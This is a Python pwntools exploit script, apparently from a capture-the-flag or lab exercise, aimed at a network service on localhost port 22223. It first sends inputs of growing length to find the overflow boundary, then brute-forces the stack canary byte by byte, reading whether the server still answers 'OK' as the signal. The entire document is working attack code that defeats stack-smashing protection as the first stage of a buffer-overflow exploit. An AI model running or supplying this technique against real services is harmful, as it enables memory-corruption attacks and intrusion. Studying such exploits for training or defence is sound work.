#!/usr/bin/env python3

from pwn import *
import time
import struct

PADDING = 72
canary = []

B=0

for i in range(64, 100):
    print("[+] Trying find boundary size#%d..." % (i))
    DATA="A"*i
    DATA=DATA.encode("ascii")
    r = remote("localhost", 22223)

    r.clean()
    r.send(DATA)

    received = ""
    try:
        received = r.recvuntil("OK")
    except EOFError:
        print("Process Died")
    finally:
        r.close()
    print(received)
    received = str(received)
    if "OK" in received:
        print("[*] size #%d is in range"%(i))
    else:
        print("[-] find size boundary #%d !" % (i-1))
        B=i
        break



for cb in range(8):

    currentByte = 0x00
    for i in range(255):

        print("[+] Trying %s (Byte #%d)..." % (hex(currentByte), cb + 1))

        DATA = "A" * B
        DATA = DATA.encode("ascii")

        r = remote("localhost", 22223)
        DATA += b"".join([struct.pack("B", c) for c in canary])
        DATA += struct.pack("B", currentByte)

        print("DATA: {}".format(DATA) )

        r.clean()
        r.send(DATA)

        received = ""
        try:
            received = r.recvuntil("OK")
        except EOFError:
            print("Process Died")
        finally:
            r.close()
        print(received)
        received = str(received)
        if "OK" in received:
            canary.append(currentByte)
            print("\n[*] Byte #%d is %s\n" % (cb + 1, hex(currentByte)))
            currentByte = 0
            break
        else:
            currentByte += 1


print("Found Canary:")
print(" ".join([hex(c) for c in canary]))
print("Boundary size #%d" % B)


